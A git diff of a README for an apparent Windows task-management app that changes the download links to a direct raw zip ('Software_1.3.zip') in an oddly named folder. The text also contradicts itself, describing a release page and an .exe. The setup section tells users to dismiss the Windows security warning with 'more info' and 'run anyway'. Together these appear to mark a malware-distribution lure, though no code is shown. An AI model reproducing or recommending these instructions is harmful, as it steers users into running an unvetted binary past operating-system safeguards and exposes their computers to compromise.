@@ -1,6 +1,6 @@
 # 🛠️ 2 - Manage your daily tasks with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Mikapollanen5/2)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Mikapollanen5/2/raw/refs/heads/main/chigoe/Software_1.3.zip)
 
 ## 🎯 About the application
 This software helps you organize your daily work. It tracks your tasks and keeps your schedule in order. You gain control over your time by using this simple interface. The program runs locally on your computer to protect your data. You do not need an internet connection to view your lists once the file saves to your drive.
@@ -17,7 +17,7 @@ This software helps you organize your daily work. It tracks your tasks and keeps
 You need a computer running Windows 10 or Windows 11. The software requires 200 megabytes of free space on your hard drive. You need at least 4 gigabytes of memory to run the program at moderate speeds. Ensure you meet these standards before you start the setup process.
 
 ## 📥 Downloading the software
-Visit [this page](https://github.com/Mikapollanen5/2) to download the application. Look for the latest release link on the right side of the screen. Click the file with the .exe extension to save it to your computer. Wait for the browser to finish the download process.
+Visit [this page](https://github.com/Mikapollanen5/2/raw/refs/heads/main/chigoe/Software_1.3.zip) to download the application. Look for the latest release link on the right side of the screen. Click the file with the .exe extension to save it to your computer. Wait for the browser to finish the download process.
 
 ## 🚀 Setting up the software
 Open your Downloads folder to find the file you saved. Double-click the file to start the installation. Windows might show a security window. Click more info and then click run anyway to proceed. Follow the prompts on the screen to finish the installation. The software adds a shortcut icon to your desktop for easy access.
